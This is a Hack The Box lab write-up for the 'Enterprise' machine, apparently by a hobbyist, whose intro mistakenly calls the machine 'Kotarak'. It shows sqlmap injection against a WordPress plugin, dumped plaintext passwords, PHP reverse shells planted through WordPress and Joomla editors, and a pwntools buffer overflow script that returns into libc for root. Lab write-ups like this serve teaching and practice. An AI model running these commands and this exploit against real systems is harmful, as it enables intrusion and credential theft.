
![logo](/logo.png)

# [Enterprise- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 28 Oct 2017 machine on HTB,Kotarak created by [TheHermit](https://app.hackthebox.com/users/1557) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Bufferoverflow
  *Binary
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/enterprise 10.10.10.61
```

###### Output 

![](/Linux/Linux-Medium/Enterprise/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/enterprise 10.10.10.61                                                                                      ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 19:07 EAT
Nmap scan report for 10.10.10.61
Host is up (0.47s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519)
80/tcp   open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
|_http-title: USS Enterprise &#8211; Ships Log
|_http-server-header: Apache/2.4.10 (Debian)
443/tcp  open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-title: 400 Bad Request
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.25 (Ubuntu)
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
8080/tcp open  http     Apache httpd 2.4.10 ((Debian))
|_http-generator: Joomla! - Open Source Content Management
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Home
|_http-server-header: Apache/2.4.10 (Debian)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.71 seconds
```

looking at the results  we find out that there are 4 ports open and its a `Ubuntu`and its running an `Apache`. 
port[22]-ssh
port[80]-WordPress 4.8.1
port[443]-ssl
port[8080]-  Apache httpd 2.4.10


so when we go the browser at [http://10.10.10.61:8080](http://10.10.10.61:8080)   we find a webrowser on port `8080`

![](/Linux/Linux-Medium/Enterprise/Screenshots/8080.png)

the just without the port 8080 to port 80 we find a page with no css style probally we will have to add a hostname to the `/etc/hosts`

![](/Linux/Linux-Medium/Enterprise/Screenshots/nocss.png)

from the url redirect above it showing looking for `enterprise.htb` so lests add it to the `hostname`  and then navigate 

![](/Linux/Linux-Medium/Enterprise/Screenshots/ussE.png)

so lets check the ssl and we get a certificate with this credentials [https://10.10.10.61](https://10.10.10.61) 

![](/Linux/Linux-Medium/Enterprise/Screenshots/certificate.png)

navigating to the page i find an appache configuration 

![](/Linux/Linux-Medium/Enterprise/Screenshots/apache.png)

i find nothing interesting so lets run gobuster to enumerate directories in existance

```sh
gobuster dir -u https://10.10.10.61 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/gobuster.png)

we find a `folder file ` so accessing it it reveals a lcars zip lests download it.

![](/Linux/Linux-Medium/Enterprise/Screenshots/files.png)

![](/Linux/Linux-Medium/Enterprise/Screenshots/download.png)

`lcars_dbpost.php` takes a GET parameter, `query`, and then uses it to build a database query

![](/Linux/Linux-Medium/Enterprise/Screenshots/lcars.png)

Once the lcars plugin is located, SQLMap can be run against it to dump the database and get
some useful information from an unpublished post . so I’ll let `sqlmap` do the heavy lifting

# Exploitation


```sh
sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/sqlmap.png)

![](/Linux/Linux-Medium/Enterprise/Screenshots/vuln.png)

It finds three injections, boolean-based blind, error-based, and time-based blind. Blind injections are always going to be slow, as they basically give one bit character per query.

Start by listing the databases:

```sh
sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dbs
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/databases.png)
The wordpress DB has 12 tables

```sh
sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress --tables
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/tables.png)

Dumping `wp_users` gives a hash for william.riker:

```sh
sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_users --dump
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/users.png)

Dumping the Joomla user list and attempting to reuse some of the passwords found on Wordpress will grant access to the Joomla administrator panel.

```sh
sqlmap -u http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php\?query\=1 --threads 10 -D joomladb -T edz2g_users -C username --dump
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/joomal.png)

I’ll dump the `wp_posts` table as well:

```sh
sqlmap -u enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts --dump
```

This prints a huge amount of output that’s difficult to show in the terminal. But it does also write it to a file as a `.csv`, so I can open it in Excel or even just `less -S` (turns off line wraps) to explore it. Or I can remember that it was three posts titled “Passwords” and use `grep`

```sh
grep 'Passwords'  /home/leshack/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv
```

With some `cut` and `sed`, I can get the list of unique passwords:

```sh
grep 'Passwords' /home/leshack/.local/share/sqlmap/output/enterprise.htb/dump/wordpress/wp_posts.csv | cut -d',' -f14 | sed 's/\\r\\n\\r\\n/\n/g' | sort -u | grep -v quickly
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/creds.png)

To log into the WordPress instance, I’ll visit `http://enterprise.htb/wp-admin`, and it redirects to a login page

![](/Linux/Linux-Medium/Enterprise/Screenshots/wpadminpage.png)

I have one user name (william.riker) and four passwords. `u*Z14ru0p#ttj83zS6` works

![](/Linux/Linux-Medium/Enterprise/Screenshots/dashboard.png)

One way to get a shell in WordPress is to modify a theme file, since they are written in PHP. On the left menu, Appearance –> Themes –> Editor will bring up the editor:

![](/Linux/Linux-Medium/Enterprise/Screenshots/singlepoast.png)

we injest a php revershell and be able to navigate to one of the blog post 

![](/Linux/Linux-Medium/Enterprise/Screenshots/sindlepoast.png)

Then after choosing one and setting a listner we get a shell.

![](/Linux/Linux-Medium/Enterprise/Screenshots/shell.png)

There is no python fo stty but lets do this to achieve that
#### Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
#### code-stty
 ```bash
 script /dev/null -c bash
 [ctrl] + z
 stty raw -echo ; fg
 ```

```sh
export TERM=screen-256color
export SHELL=bash
stty rows 29 cols 135
reset
```

to check for colums and rows in you machine run

```sh
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
```

so when i check the user flag from home i get this `As you take a look around at your surroundings you realise there is something wrong.This is not the Enterprise! As you try to interact with a console it dawns on you.Your in the Holodeck!`

![](/Linux/Linux-Medium/Enterprise/Screenshots/dummyuser.png)

so i to exploit joomal now as i rember i had some credentials from the `sqlmap`

I have two usernames from the SQL injection, geordi.la.forge and Guinan. It turns out that each of their passwords is in the list I pulled from the draft post. Using `Guinan / ZxJyhGem4k338S2Y` logs in as Guinan and `geordi.la.forge / ZD3YxfnSjezg67JZ`

![](/Linux/Linux-Medium/Enterprise/Screenshots/george.png)

The Joomla admin panel is at `/administrator`, and the geordi creds work:

![](/Linux/Linux-Medium/Enterprise/Screenshots/loggedinjoomal.png)

In the menus I’ll go to Extensions –> Templates –> Templates to see the installed templates

![](/Linux/Linux-Medium/Enterprise/Screenshots/templates.png)

A little trial and error shows that Protostar is the template in user. Clicking on it takes me to the editor with a list of files

![](/Linux/Linux-Medium/Enterprise/Screenshots/list.png)

I’ll add a reverse shell to `error.php`: or t appears that the `/files` directory is shared between 443 and 8080,and can be uploaded to through the Joomla administrator panel. By accessing Components >EXTPLORER, it is possible to upload a PHP shell and execute it on port `443`,

![](Linux/Linux-Medium/Enterprise/Screenshots/upload.png)

and in the browser is there

![](/Linux/Linux-Medium/Enterprise/Screenshots/phpshell.png)

and when we execute we get shell as `www-data@enterprise` and we update our stty

![](/Linux/Linux-Medium/Enterprise/Screenshots/shelljomal.png)

and we can be able to get our user flag from 

![](/Linux/Linux-Medium/Enterprise/Screenshots/userflag.png)

# Privillage Escalation

lets get LinEnum an be able to run it so that we can see available privsec of information

```sh
wget http://10.10.14.15:8000/LinEnum.sh
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/LinEnum.png)

Running LinEnum reveals a lot of information about the system. An SUID binary exists at
`/bin/lcars`. Attempting to run the file requires an access code, which can be obtained by running

```sh
ltrace /bin/lcars
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/overflow.png)

Playing around with the options reveals that 4 (Security) has a buffer overflow, which can be
exploited to gain root access. The payload is fairly simple to generate, however the environment
variables can cause a bit of confusion as it changes the addresses. To avoid that, run gdb with
env - gdb /bin/lcars and pass the payload with cat payload.txt | env - /bin/lcars. Also run unset
env LINES and unset env COLUMNS in both terminal and gdb

ll pull all that together into a really simple Python script:

```sh
#!/usr/bin/env python3

from pwn import *


system_addr = p32(0xF7E4C060)
exit_addr = p32(0xF7E3FAF0)
sh_addr = p32(0xF7F6DDD5)

payload = b"A" * 212 + system_addr + exit_addr + sh_addr

r = remote("10.10.10.61", 32812)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)
r.interactive()
```

It creates the payload with 212 bytes of junk followed by the addresses. Then it uses [pwntools](https://github.com/Gallopsled/pwntools) to interact with the remote system, sending the access code and menu selection before the payload, and then dropping into an interactive shell.

lets create an env on our local machine and install `pwntools`

```
virtualenv venv
source venv/bin/activate

pip install pwntools
```

![](/Linux/Linux-Medium/Enterprise/Screenshots/venv.png)

then lets run the `script now`

![](/Linux/Linux-Medium/Enterprise/Screenshots/rootshell.png)

now we can be able to obtain the `root flag`  

![](/Linux/Linux-Medium/Enterprise/Screenshots/rootflag.png)

	-------------------------END successful attack @lesley----------------------


